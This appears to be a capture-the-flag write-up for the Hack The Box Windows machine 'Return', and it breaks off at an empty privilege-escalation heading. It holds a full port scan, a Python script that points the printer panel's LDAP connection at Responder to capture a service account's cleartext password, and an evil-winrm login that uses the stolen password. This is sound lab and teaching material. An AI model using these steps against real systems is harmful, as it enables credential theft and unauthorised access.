# Return (Easy - Windows)

## Recon
```console
# nmap -Pn --open -sC -sV -p- 10.10.11.108
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 03:23 GMT
Nmap scan report for 10.10.11.108
Host is up (0.016s latency).
Not shown: 65402 closed ports, 109 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-19 04:44:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
60147/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Initial Access

### Ladp Pass-back Attack
By inspecting the network of the Settings page, `settings.php` has a `ip=` parameter which can be used to connect to a remote server. While running `Responder`, run the following script:

```python
#!/usr/bin/python3

import requests
import sys

def connect(url, endpoint):

	data = {
		"ip": sys.argv[1]
	}

	r = requests.post(url + endpoint, data=data)

if __name__ == '__main__':
	url = "http://10.10.11.108"
	endpoint = "/settings.php"

	connect(url, endpoint)
```

We can get the password for the `return\svc-printer` user.

```
[LDAP] Cleartext Client   : 10.10.11.108
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

### Winrm Access (svc-printer)

```console
# ./evil-winrm.rb -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

### user.txt

```console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
e59d5**REDACTED**52a84
```

## Privesc

### Server Operators Privilege







